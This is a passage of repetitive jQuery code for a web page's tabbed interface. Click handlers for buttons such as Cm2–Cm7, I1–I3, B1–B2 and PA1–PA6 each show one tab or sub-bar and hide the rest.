		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#I3Tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#tU5tab").hide();
	})
	$("#Cm2").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").show();
		$("#CM2Tab").show();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#tU1tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
	})
	$("#Cm3").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").show();
		$("#CM2Tab").hide();
		$("#CM3Tab").show();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#tU5tab").hide();
	})
	$("#Cm4").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").show();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").show();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
	})
	$("#Cm5").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").show();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").show();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#tU3tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
	})
	$("#Cm6").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").show();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").show();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
	})
	$("#Cm7").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").show();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").show();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#tU3tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
	})
	$("#t7").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").show();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#I1Tab").show();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
	})
	$("#I1").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").show();
		$("#I1Tab").show();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
	})
	$("#I2").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").show();
		$("#I1Tab").hide();
		$("#I2Tab").show();
		$("#I3Tab").hide();
	})
	$("#I3").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").show();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#B1Tab").hide();
		$("#I3Tab").show();
	})
	$("#t8").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").show();
		$("#B1Tab").show();
		$("#B2Tab").hide();
	})
	$("#B1").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").show();
		$("#B1Tab").show();
		$("#B2Tab").hide();
	})
	$("#B2").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#sub6bar").hide();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").show();
		$("#B1Tab").hide();
		$("#B2Tab").show();
	})
	$("#t9").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub6bar").show();
		$("#PA1tab").show();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();

	})
	$("#PA1").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub6bar").show();
		$("#PA1tab").show();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#sub6bar").show();
		$("#PA1tab").show();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();

	})
	$("#PA2").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub6bar").show();
		$("#PA1tab").hide();
		$("#PA2tab").show();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
		$("#sub6bar").show();
		$("#PA1tab").hide();
		$("#PA2tab").show();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();
	})
	$("#PA3").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub6bar").show();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").show();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").hide();

	})
	$("#PA4").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub6bar").show();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").show();
		$("#PA5tab").hide();
		$("#PA6tab").hide();

	})
	$("#PA5").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub6bar").show();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").show();
		$("#PA6tab").hide();

	})
	$("#PA6").click(() => {
		$("#CM1Tab").hide();
		$("#sub3bar").hide();
		$("#CM2Tab").hide();
		$("#CM3Tab").hide();
		$("#CM4Tab").hide();
		$("#CM5Tab").hide();
		$("#CM6Tab").hide();
		$("#CM7Tab").hide();
		$("#t1tab").hide();
		$("#t2tab").hide();
		$("#t3tab").hide();
		$("#tF1tab").hide();
		$("#sub1bar").hide();
		$("#tF2tab").hide();
		$("#tF3tab").hide();
		$("#tF3tab").hide();
		$("#tF4tab").hide();
		$("#tF5tab").hide();
		$("#sub2bar").hide();
		$("#tU1tab").hide();
		$("#tU2tab").hide();
		$("#tU3tab").hide();
		$("#tU4tab").hide();
		$("#tU5tab").hide();
		$("#sub4bar").hide();
		$("#I1Tab").hide();
		$("#I2Tab").hide();
		$("#I3Tab").hide();
		$("#sub5bar").hide();
		$("#B1Tab").hide();
		$("#B2Tab").hide();
		$("#sub6bar").show();
		$("#PA1tab").hide();
		$("#PA2tab").hide();
		$("#PA3tab").hide();
		$("#PA4tab").hide();
		$("#PA5tab").hide();
		$("#PA6tab").show();
	})
	
})

